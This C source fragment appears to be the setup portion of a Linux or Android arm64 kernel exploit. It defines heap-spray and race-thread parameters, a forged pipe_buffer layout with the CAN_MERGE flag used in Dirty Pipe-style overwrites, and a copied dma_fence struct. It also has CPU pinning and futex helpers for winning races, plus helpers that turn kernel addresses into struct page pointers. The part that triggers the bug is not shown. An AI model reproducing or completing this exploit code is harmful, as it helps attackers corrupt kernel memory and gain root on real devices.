#define _GNU_SOURCE
#include <inttypes.h>
#include <err.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/un.h>
#include <stddef.h>
#include <sched.h>
#include <dirent.h>
#include <endian.h>
#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <asm/types.h>
#include <linux/futex.h>

#include "config.h"

#define CPU0  0
#define CPU1  1
#define CPU2  2

#define TRIGGER_THREADS  50
#define REALLOC_THREADS  40
#define REALLOC_BUF_SIZE 64
#define PIPE_NUM_SPRAYS  15

#define PIPE_BUF_FLAG_CAN_MERGE 0x10


struct pipe_buffer {
  uint64_t page;
  unsigned int offset, len;
  uint64_t ops;
  unsigned int flags;
  unsigned int __filler;
  uint64_t private;
} __attribute__((packed));


struct realloc_thread_arg
{
  pthread_t tid;
  int recv_fd;
  int send_fd;
  struct sockaddr_un addr;
};


typedef struct {
  int counter;
} atomic_t;


typedef struct refcount_struct {
  atomic_t refs;
} refcount_t;


struct kref {
  refcount_t refcount;
};


struct list_head {
  uint64_t next, prev;
};


struct dma_fence {
  void *lock;
  void *ops;
  union {
    struct list_head cb_list;
    int64_t timestamp;
  };
  uint64_t context;
  uint64_t seqno;
  unsigned long flags;
  uint32_t refcount;
  int error;
};


static int futex(uint32_t *uaddr, int futex_op, uint32_t val,
       const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
     return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}


static void fpost(uint32_t *futexp) {
    long s;
    const uint32_t zero = 0;
    s = futex(futexp, FUTEX_WAKE, 1, NULL, NULL, 0);
}


static void fwait(uint32_t *futexp) {
   long s;
   s = futex(futexp, FUTEX_WAIT, 0, NULL, NULL, 0);
   if (s == -1)
       printf("futex-FUTEX_WAIT\n");
  
}


void sleep_ms(uint64_t ms) {
  usleep(ms * 1000);
}


int pin_cpu(int core, pthread_t thr_id) {
  int syscallres;
  pid_t pid = gettid();
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(core, &cpuset);
  syscallres = syscall(__NR_sched_setaffinity, pid, sizeof(cpuset), &cpuset);
  
  if (syscallres)
    return -1;

  return 0;
}


int set_prio(int policy, int prio) {
  struct sched_param param;
  param.sched_priority = prio;

  return pthread_setschedparam(pthread_self(), policy, &param);
}


// Kernels with CONFIG_SPARSEMEM_VMEMMAP=y
uint64_t virt_to_page(uint64_t kaddr, uint64_t vmemmap_start) {
  return (((kaddr - (PAGE_OFFSET)) >> 12) << 6) + vmemmap_start;
}

int is_lm_addr(uint64_t kaddr) {
    return (kaddr & 0xffffffc000000000UL) == PAGE_OFFSET;
}

uint64_t kimg_to_lm(uint64_t kaddr, uint64_t kbase_addr) {
    if (is_lm_addr(kaddr)) {
        return kaddr;
    }
    return PAGE_OFFSET + (kaddr - kbase_addr);
}
